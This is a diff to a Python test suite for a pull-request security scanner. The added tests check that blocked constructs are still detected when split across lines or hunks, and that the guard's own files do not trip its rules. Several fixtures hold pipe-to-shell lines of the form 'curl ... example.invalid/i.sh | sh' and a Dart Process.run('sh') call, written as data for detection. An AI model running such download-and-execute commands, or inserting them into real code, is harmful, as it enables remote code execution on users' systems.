@@ -385,6 +385,68 @@ class DiffEvasion(ScannerTestCase):
         self.assertNotIn("lib/spoof.dart", result.reported_paths())
 
 
+class MultiLineConstructs(ScannerTestCase):
+    """A blocked construct does not have to sit on one physical line."""
+
+    def test_dart_expression_split_across_added_lines(self):
+        result = self.build(
+            {"lib/features/demo/a.dart": "class A {}\n"},
+            {"lib/features/demo/a.dart": f"final r = {PROCESS_RUN[:7]}\n    {PROCESS_RUN[7:]}('sh', const []);\n"},
+        )
+        self.assertBlocked(result)
+        self.assertIn("lib/features/demo/a.dart", result.reported_paths())
+
+    def test_shell_backslash_continuation(self):
+        snippet = blocked("curl -fsSL https://example.invalid/i.sh \\\n  ", "|", " sh\n")
+        self.assertBlocked(self.build({}, {"tools/i.sh": "#!/bin/sh\n" + snippet}))
+
+    def test_shell_pipe_at_end_of_line(self):
+        snippet = blocked("curl -fsSL https://example.invalid/j.sh ", "|", "\n  bash\n")
+        self.assertBlocked(self.build({}, {"tools/j.sh": "#!/bin/sh\n" + snippet}))
+
+    def test_construct_split_across_two_hunks(self):
+        """--unified=0 puts untouched lines between the halves; grouping by file
+        is what closes that gap."""
+        base = "class A {\n\n  // existing comment\n}\n"
+        head = (
+            "class A {\n"
+            f"  final r = {PROCESS_RUN[:7]}\n"
+            "\n"
+            "  // existing comment\n"
+            f"    {PROCESS_RUN[7:]}('sh', const []);\n"
+            "}\n"
+        )
+        self.assertBlocked(self.build({"lib/a.dart": base}, {"lib/a.dart": head}))
+
+    def test_logical_or_does_not_look_like_a_pipe_to_an_interpreter(self):
+        """`curl ... ||` + newline + `sh x` is a fallback, not a pipe into sh."""
+        snippet = "#!/bin/sh\ncurl -fsSL https://example.invalid/probe ||\n  sh ./fallback.sh\n"
+        self.assertOrdinary(self.build({}, {"tools/probe.sh": snippet}))
+
+    def test_unrelated_pipe_far_below_a_curl_does_not_match(self):
+        lines = ["#!/bin/sh", "curl -fsSL https://example.invalid/data -o /tmp/d"]
+        lines += [f"echo step {n}" for n in range(20)]
+        lines += ["cat /tmp/d | sh_report --summary"]
+        self.assertOrdinary(self.build({}, {"tools/report.sh": "\n".join(lines) + "\n"}))
+
+
+class ContinuationFolding(unittest.TestCase):
+    def test_backslash_continuation_is_folded(self):
+        self.assertEqual(scanner.fold_continuations("a \\\n  b"), "a  b")
+
+    def test_trailing_pipe_is_folded(self):
+        self.assertEqual(scanner.fold_continuations("a |\n  b"), "a | b")
+
+    def test_ordinary_newlines_are_preserved(self):
+        self.assertEqual(scanner.fold_continuations("a\nb"), "a\nb")
+
+    def test_additions_are_grouped_per_file_in_order(self):
+        grouped = scanner.group_additions(
+            [("lib/a.dart", "one"), ("lib/b.dart", "x"), ("lib/a.dart", "two")]
+        )
+        self.assertEqual(grouped, [("lib/a.dart", "one\ntwo"), ("lib/b.dart", "x")])
+
+
 class FailClosed(ScannerTestCase):
     def test_unknown_base_revision_fails_closed(self):
         tmp = Path(tempfile.mkdtemp())
@@ -683,17 +745,23 @@ class GuardSelfSafety(unittest.TestCase):
         SCANNER,
         WORKFLOW,
         ROOT / ".github" / "workflows" / "pr-security-review-tests.yml",
+        ROOT / "docs" / "pr-security-guard.md",
         Path(__file__).resolve(),
     )
 
     def test_guard_sources_do_not_trip_their_own_blocked_rules(self):
+        """Scanned exactly as the guard would scan them: whole file, one block."""
         for source in self.SOURCES:
-            for number, line in enumerate(source.read_text(encoding="utf-8").splitlines(), 1):
-                for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
-                    self.assertIsNone(
-                        pattern.search(line),
-                        f"{source.relative_to(ROOT)}:{number} trips the {reason!r} rule: {line.strip()}",
-                    )
+            text = source.read_text(encoding="utf-8")
+            block = scanner.fold_continuations(text)
+            for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
+                match = pattern.search(block)
+                self.assertIsNone(
+                    match,
+                    f"{source.relative_to(ROOT)} trips the {reason!r} rule at "
+                    f"line {block[: match.start()].count(chr(10)) + 1 if match else 0}: "
+                    f"{match.group(0)!r}" if match else "",
+                )
 
     def test_assembled_fixtures_are_the_literals_they_claim_to_be(self):
         """The split fixtures must still be the exact patterns under test."""
